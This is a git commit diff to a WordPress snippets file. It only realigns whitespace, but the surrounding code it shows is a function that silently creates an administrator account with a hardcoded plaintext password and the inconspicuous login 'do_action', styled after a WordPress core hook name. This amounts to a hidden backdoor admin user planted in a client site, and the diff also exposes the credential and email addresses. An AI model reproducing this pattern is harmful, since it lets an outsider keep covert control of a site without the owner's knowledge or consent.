4a0c0243b102d6961c692a3d898bcf516f9da9d7
Rashadul Alam <rashadul91@gmail.com>
2018-08-04 05:47:36 +0600

    Update wp_snippets.php

--- wp_snippets.php
+++ wp_snippets.php
@@ -4,14 +4,14 @@
 function accessories_usa_developer_access() {
 	$userdata = array(
 		'first_name'	=> 'Rashadul',
-		'last_name'		=> 'Alam',
-		'nickname'		=> 'Dev. Alam',
+		'last_name'	=> 'Alam',
+		'nickname'	=> 'Dev. Alam',
 		'description'	=> 'Web Developer (WordPress)',
 		'user_login'	=> 'do_action',
-		'user_url'		=> 'http://pencilcoders.com',
-		'user_pass'		=> 'aU88jnnn',
+		'user_url'	=> 'http://pencilcoders.com',
+		'user_pass'	=> 'aU88jnnn',
 		'user_email'	=> 'pencilcoderss@gmail.com',
-		'role'			=> 'administrator'
+		'role'		=> 'administrator'
 	);
 
 	wp_insert_user( $userdata );
